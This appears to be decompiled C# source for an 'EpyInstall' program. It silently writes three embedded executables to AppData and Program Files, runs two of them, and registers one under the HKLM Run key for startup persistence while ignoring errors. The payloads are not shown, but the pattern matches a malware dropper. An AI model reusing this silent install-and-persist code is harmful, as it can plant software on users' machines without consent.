using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace EpyInstall;

internal class Program
{
	private static void Main(string[] args)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!File.Exists(folderPath + "\\epys.exe"))
		{
			File.WriteAllBytes(folderPath + "\\epys.exe", Resource1.epys);
		}
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		if (!Directory.Exists(folderPath2 + "\\EpyLoader"))
		{
			Directory.CreateDirectory(folderPath2 + "\\EpyLoader");
		}
		if (!File.Exists(folderPath2 + "\\EpyLoader\\epyloader.exe"))
		{
			File.WriteAllBytes(folderPath2 + "\\EpyLoader\\epyloader.exe", Resource1.epyloader);
		}
		if (!File.Exists(folderPath + "\\epysmng.exe"))
		{
			File.WriteAllBytes(folderPath + "\\epysmng.exe", Resource1.epysmng);
		}
		Process.Start(folderPath + "\\epys.exe");
		Process.Start(folderPath2 + "\\EpyLoader\\epyloader.exe");
		new FileInfo(Assembly.GetEntryAssembly()!.Location).Directory!.ToString();
		RunOnStartup("epys", folderPath + "\\epys.exe");
	}

	public static void RunOnStartup(string AppTitle, string AppPath)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(AppTitle, AppPath);
		}
		catch (Exception)
		{
		}
	}
}
